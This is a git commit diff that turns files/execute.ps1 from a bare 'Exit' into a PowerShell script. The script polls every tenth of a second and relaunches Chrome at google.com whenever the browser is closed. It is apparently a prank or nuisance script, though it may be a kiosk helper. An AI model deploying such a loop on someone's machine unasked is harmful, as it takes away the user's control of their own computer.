220ad887cf60c69b223180b275abfc61c9368301
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-05 19:26:49 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -1,1 +1,26 @@
-Exit
+function FindChromePath {
+    $chromePath = (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe').'(default)'
+    return $chromePath
+}
+
+function IsChromeRunning {
+    $chromeProcess = Get-Process "chrome" -ErrorAction SilentlyContinue
+    return $chromeProcess -ne $null
+}
+
+function OpenChrome {
+    $chromePath = FindChromePath
+    if ($chromePath -ne $null) {
+        Start-Process $chromePath "https://www.google.com"
+        Write-Host ""
+    }
+}
+
+while ($true) {
+    $chromeRunning = IsChromeRunning
+    if (-not $chromeRunning) {
+        OpenChrome
+    }
+    Start-Sleep -Seconds 0.1
+}
+
